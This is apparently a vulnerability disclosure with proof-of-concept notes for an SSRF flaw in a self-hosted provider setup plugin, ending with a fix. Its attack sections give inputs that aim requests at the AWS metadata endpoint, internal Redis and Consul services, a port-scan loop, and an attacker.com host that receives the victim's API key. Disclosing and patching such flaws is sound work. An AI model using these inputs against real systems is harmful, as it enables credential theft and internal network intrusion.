# PoC: SSRF via Unguarded fetch() in Self-Hosted Provider Setup

## Vulnerability
`src/plugins/provider-self-hosted-setup.ts:61` uses raw `fetch()` without
`fetchWithSsrFGuard`, allowing SSRF attacks via user-provided `baseUrl`.

## Severity: HIGH

## Affected Code

```typescript
// src/plugins/provider-self-hosted-setup.ts:56-64
const trimmedBaseUrl = params.baseUrl.trim().replace(/\/+$/, "");
const url = `${trimmedBaseUrl}/models`;
const response = await fetch(url, {  // <-- RAW FETCH, NO SSRF GUARD
  headers: trimmedApiKey ? { Authorization: `Bearer ${trimmedApiKey}` } : undefined,
  signal: AbortSignal.timeout(5000),
});
```

## Proof of Concept

### Attack 1: Cloud Metadata Credential Theft

```
User configures self-hosted provider with:
  baseUrl = "http://169.254.169.254/latest/meta-data"

Result:
  fetch("http://169.254.169.254/latest/meta-data/models")
  → AWS metadata endpoint responds (or error reveals internal info)
  → If IAM role attached: credential theft possible via /iam/security-credentials/
```

### Attack 2: Internal Service Probing

```
baseUrl = "http://localhost:6379"
→ fetch("http://localhost:6379/models")
→ Redis responds with protocol error → confirms Redis is running

baseUrl = "http://10.0.0.5:8500"
→ fetch("http://10.0.0.5:8500/models")
→ Consul API responds → internal service discovery exposed
```

### Attack 3: Port Scanning

```
for port in range(1, 65536):
  baseUrl = f"http://10.0.0.1:{port}"
  # Timeout = service not listening
  # Connection refused = port closed
  # Response = service found
```

### Attack 4: Authorization Header Leakage

```
baseUrl = "http://attacker.com"
apiKey = "sk-real-api-key"
→ fetch("http://attacker.com/models", { headers: { Authorization: "Bearer sk-real-api-key" }})
→ Attacker receives victim's API key in Authorization header
```

## Second Unguarded Call

`extensions/ollama/src/stream.ts:649` — same pattern with operator-configured URL.

## Root Cause

These two fetch calls were added without using the project's established
`fetchWithSsrFGuard` wrapper that enforces DNS pinning and IP blocklisting.

## Impact

- Cloud metadata credential theft (AWS/GCP/Azure IAM roles)
- Internal network service enumeration
- API key/token leakage to attacker-controlled endpoints
- Potential for chaining with other vulnerabilities

## Remediation

Replace raw `fetch()` with `fetchWithSsrFGuard()` using appropriate policy.
See accompanying patch.
